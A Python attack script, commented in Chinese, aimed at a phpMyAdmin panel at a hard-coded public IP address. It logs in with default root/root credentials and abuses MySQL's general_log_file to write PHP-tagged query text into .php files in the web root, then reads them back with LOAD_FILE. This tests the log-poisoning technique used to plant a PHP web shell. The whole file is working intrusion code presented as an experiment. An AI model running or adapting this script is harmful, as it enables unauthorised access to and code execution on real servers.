#!/usr/bin/env python3
"""对照实验: 确认 import.php 对 <?php ?> 的处理机制
写 3 个文件对比:
A. 纯文本      SELECT 'HELLO_123'
B. php标签     SELECT '<?php echo 111222333;?>'
C. 混合        SELECT 'pre<?php echo 444555;?>post'
然后用 LOAD_FILE 读回对比
"""
import urllib.request, http.cookiejar, re, urllib.parse, time

B = "http://81.70.245.25/phpmyadmin/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

# A: 纯文本
sql("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/ta.php'")
sql("SET GLOBAL general_log = 'ON'")
sql("SELECT 'HELLO_123'")
sql("SET GLOBAL general_log = 'OFF'")

# B: php标签
sql("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/tb.php'")
sql("SET GLOBAL general_log = 'ON'")
sql("SELECT '<?php echo 111222333;?>'")
sql("SET GLOBAL general_log = 'OFF'")

# C: 混合
sql("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/tc.php'")
sql("SET GLOBAL general_log = 'ON'")
sql("SELECT 'pre<?php echo 444555;?>post'")
sql("SET GLOBAL general_log = 'OFF'")

time.sleep(1)
# 读回
for f in ["ta", "tb", "tc"]:
    r = sql(f"SELECT LOAD_FILE('C:/phpStudy/WWW/{f}.php')")
    # 提取实际内容
    m = re.search(r'Query\tSELECT ([^\n]+)', r)
    print(f"=== {f}.php 记录: ===")
    print("  ", m.group(1)[:120] if m else "??")
